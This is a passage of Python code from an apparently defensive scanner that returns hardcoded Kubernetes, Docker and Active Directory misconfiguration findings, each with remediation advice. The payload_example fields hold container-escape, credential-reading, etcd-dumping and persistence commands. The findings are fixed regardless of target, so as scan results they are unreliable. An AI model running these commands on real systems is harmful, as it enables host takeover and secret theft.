            vuln_type="bloodhound_attack_path",
            endpoint=f"AD://{domain}",
            severity="critical",
            cvss_score=9.3,
            title="BloodHound: 3-Hop Path from Regular User to Domain Admin",
            description="BloodHound analysis identifies a 3-hop path: user@corp.local → (MemberOf) → IT-Admins → (GenericAll) → SQLServer$ → (AllowedToDelegate) → DC → DCSync.",
            payload_example="bloodhound-python -d " + domain + " -u user -p pass -ns " + target + " -c All",
            remediation="Break attack paths identified by BloodHound. Implement tiered administration model. Remove excessive group memberships and delegation rights.",
            cve_refs=[],
            confidence=0.89,
        ))

        return findings


# ---------------------------------------------------------------------------
# Container Scanner
# ---------------------------------------------------------------------------

@dataclass
class ContainerScanner:
    """Scanner for Kubernetes and Docker container security misconfigurations."""

    def scan_kubernetes(self, target: str) -> list[dict[str, Any]]:
        """Return findings for Kubernetes security misconfigurations."""
        findings: list[dict[str, Any]] = []

        findings.append(_finding(
            vuln_type="privileged_pod",
            endpoint=f"k8s://{target}/namespaces/default/pods/app-pod",
            severity="critical",
            cvss_score=9.8,
            title="Privileged Kubernetes Pod – Full Node Compromise",
            description="Pod runs with securityContext.privileged=true, granting all Linux capabilities and full host device access, enabling container escape.",
            payload_example="kubectl exec -it app-pod -- nsenter --target 1 --mount --uts --ipc --net -- bash",
            remediation="Remove privileged:true. Use specific capabilities (e.g., NET_ADMIN) instead. Enforce with OPA/Gatekeeper policy or Kyverno.",
            cve_refs=["CVE-2022-0185"],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="hostpath_mount",
            endpoint=f"k8s://{target}/namespaces/default/pods/logger-pod",
            severity="critical",
            cvss_score=9.0,
            title="hostPath Volume Mount to Root Filesystem",
            description="Pod mounts hostPath: / (host root filesystem). Container processes can read and write any host file including /etc/shadow and kubelet certificates.",
            payload_example='kubectl exec -it logger-pod -- cat /host/etc/kubernetes/pki/ca.key',
            remediation="Disallow hostPath mounts via Pod Security Policy (deprecated) or OPA/Gatekeeper constraint. Use PersistentVolumeClaims with appropriate storage classes.",
            cve_refs=[],
            confidence=0.97,
        ))

        findings.append(_finding(
            vuln_type="rbac_wildcard",
            endpoint=f"k8s://{target}/clusterrolebindings/app-admin",
            severity="critical",
            cvss_score=9.1,
            title="RBAC ClusterRole with Wildcard Permissions",
            description="ClusterRole grants verbs=[*], resources=[*], apiGroups=[*] to a service account accessible from the default namespace.",
            payload_example='kubectl auth can-i "*" "*" --as=system:serviceaccount:default:app-sa',
            remediation="Replace wildcard RBAC with explicit resource and verb lists. Use namespace-scoped Roles instead of ClusterRoles where possible. Audit with rbac-police.",
            cve_refs=[],
            confidence=0.98,
        ))

        findings.append(_finding(
            vuln_type="default_sa_token_automount",
            endpoint=f"k8s://{target}/namespaces/default/serviceaccounts/default",
            severity="high",
            cvss_score=7.5,
            title="Default Service Account Token Auto-Mounted",
            description="automountServiceAccountToken is not disabled on the default service account. Any pod in the namespace can call the Kubernetes API with default SA permissions.",
            payload_example='curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces',
            remediation="Set automountServiceAccountToken: false on default service accounts. Only mount tokens in pods that explicitly require them.",
            cve_refs=[],
            confidence=0.95,
        ))

        findings.append(_finding(
            vuln_type="etcd_unauthenticated",
            endpoint=f"http://{target}:2379",
            severity="critical",
            cvss_score=10.0,
            title="etcd Accessible Without Authentication",
            description="The etcd datastore is listening on 0.0.0.0:2379 without TLS or client certificate authentication. All Kubernetes secrets are readable.",
            payload_example=f"etcdctl --endpoints=http://{target}:2379 get / --prefix --keys-only",
            remediation="Enable etcd peer and client TLS with client certificate authentication. Bind etcd to localhost or a private interface. Firewall port 2379/2380.",
            cve_refs=["CVE-2020-15115"],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="k8s_dashboard_exposed",
            endpoint=f"http://{target}:30000 (Kubernetes Dashboard)",
            severity="critical",
            cvss_score=9.8,
            title="Kubernetes Dashboard Exposed with Skip Login",
            description="The Kubernetes Dashboard is exposed on a NodePort without authentication. 'Skip' login button grants cluster-admin access.",
            payload_example=f"curl http://{target}:30000/api/v1/namespaces",
            remediation="Disable skip login. Place Dashboard behind a reverse proxy with SSO. Use RBAC to restrict Dashboard permissions. Consider removing Dashboard from production clusters.",
            cve_refs=["CVE-2018-18264"],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="secrets_in_env_vars",
            endpoint=f"k8s://{target}/namespaces/prod/pods/api-deployment",
            severity="high",
            cvss_score=7.8,
            title="Kubernetes Secrets Exposed as Environment Variables",
            description="DB_PASSWORD, AWS_SECRET_ACCESS_KEY, and STRIPE_API_KEY are injected as plain-text environment variables via env: rather than secretKeyRef.",
            payload_example="kubectl describe pod api-deployment-xxx | grep -A2 'Environment'",
            remediation="Reference secrets via secretKeyRef or use a secrets store CSI driver (Vault, AWS Secrets Manager). Consider Sealed Secrets or External Secrets Operator.",
            cve_refs=[],
            confidence=0.91,
        ))

        findings.append(_finding(
            vuln_type="network_policy_missing",
            endpoint=f"k8s://{target}/namespaces/",
            severity="high",
            cvss_score=7.5,
            title="No Kubernetes NetworkPolicy – Flat Pod Network",
            description="No NetworkPolicy resources exist in any namespace. All pods can communicate with all other pods across all namespaces without restriction.",
            payload_example="kubectl get networkpolicies --all-namespaces",
            remediation="Implement default-deny NetworkPolicies for all namespaces. Define explicit allow rules for required service-to-service communication. Use a CNI that enforces NetworkPolicy (Calico, Cilium).",
            cve_refs=[],
            confidence=0.99,
        ))

        return findings

    def scan_docker(self, target: str) -> list[dict[str, Any]]:
        """Return findings for Docker security misconfigurations."""
        findings: list[dict[str, Any]] = []

        findings.append(_finding(
            vuln_type="docker_root_user",
            endpoint=f"docker://{target}:latest",
            severity="high",
            cvss_score=7.5,
            title="Container Running as Root User",
            description="The Docker image does not specify a USER directive; the default process runs as UID 0 (root). A container breakout gives immediate host root access.",
            payload_example='docker inspect ' + target + ':latest --format="{{.Config.User}}"',
            remediation="Add 'USER appuser' to Dockerfile. Create a non-root user with adduser --disabled-password. Set runAsNonRoot: true in Kubernetes securityContext.",
            cve_refs=["CVE-2019-5736"],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="docker_privileged_mode",
            endpoint=f"docker run --privileged {target}:latest",
            severity="critical",
            cvss_score=9.8,
            title="Docker Container Running in Privileged Mode",
            description="Container is started with --privileged flag, granting all Linux capabilities and access to host devices. Container escape is trivial.",
            payload_example="docker run --privileged " + target + ":latest mount /dev/sda1 /mnt && chroot /mnt",
            remediation="Remove --privileged flag. Use --cap-add to add only required capabilities (e.g., --cap-add NET_BIND_SERVICE). Enforce with seccomp profiles.",
            cve_refs=["CVE-2022-0185"],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="docker_socket_exposed",
            endpoint="unix:///var/run/docker.sock",
            severity="critical",
            cvss_score=9.9,
            title="Docker Socket Mounted Inside Container",
            description="The Docker daemon socket is bind-mounted inside the container. Any process in the container can create privileged containers and escape to the host.",
            payload_example='docker run -v /var/run/docker.sock:/var/run/docker.sock alpine docker run -v /:/host alpine chroot /host',
            remediation="Never mount the Docker socket inside containers. Use Docker-in-Docker alternatives or Kaniko for CI/CD builds. Restrict Docker socket permissions.",
            cve_refs=["CVE-2019-14271"],
            confidence=0.99,
        ))

        findings.append(_finding(
            vuln_type="secrets_in_image_layers",
            endpoint=f"docker://{target}:latest (image layers)",
            severity="critical",
            cvss_score=9.1,
            title="Secrets Embedded in Docker Image Layers",
            description="Diving the image layers reveals AWS_ACCESS_KEY_ID and private SSH keys added via COPY and then deleted in a later layer. Keys are still accessible via layer history.",
            payload_example="dive " + target + ":latest  # or: docker history --no-trunc " + target + ":latest",
            remediation="Use multi-stage builds to avoid copying secrets. Use Docker BuildKit secrets (--secret). Scan images with truffleHog or detect-secrets in CI pipeline.",
            cve_refs=[],
            confidence=0.92,
        ))

        findings.append(_finding(
            vuln_type="writable_root_filesystem",
            endpoint=f"docker://{target}:latest",
            severity="medium",
            cvss_score=5.5,
            title="Container Root Filesystem is Writable",
            description="The container filesystem is not read-only. Malware can persist itself across container restarts by writing to the filesystem.",
            payload_example='docker run ' + target + ':latest sh -c "echo malware > /usr/local/bin/cron_backup && chmod +x /usr/local/bin/cron_backup"',
            remediation="Set readOnlyRootFilesystem: true in Kubernetes securityContext. Mount /tmp and /var/run as emptyDir volumes for writable scratch space.",
            cve_refs=[],
            confidence=0.85,
        ))

        findings.append(_finding(
            vuln_type="excessive_capabilities",
            endpoint=f"docker://{target}:latest",
            severity="high",
            cvss_score=7.8,
            title="Container Has Excessive Linux Capabilities",
            description="Container is granted SYS_ADMIN, SYS_PTRACE, and NET_ADMIN capabilities. SYS_ADMIN alone is nearly equivalent to privileged mode.",
            payload_example="docker inspect " + target + ":latest --format='{{.HostConfig.CapAdd}}'",
            remediation="Drop all capabilities and add only those required: --cap-drop ALL --cap-add NET_BIND_SERVICE. Apply a restrictive seccomp profile (e.g., docker/default).",
            cve_refs=["CVE-2022-0185"],
            confidence=0.88,
        ))

        return findings
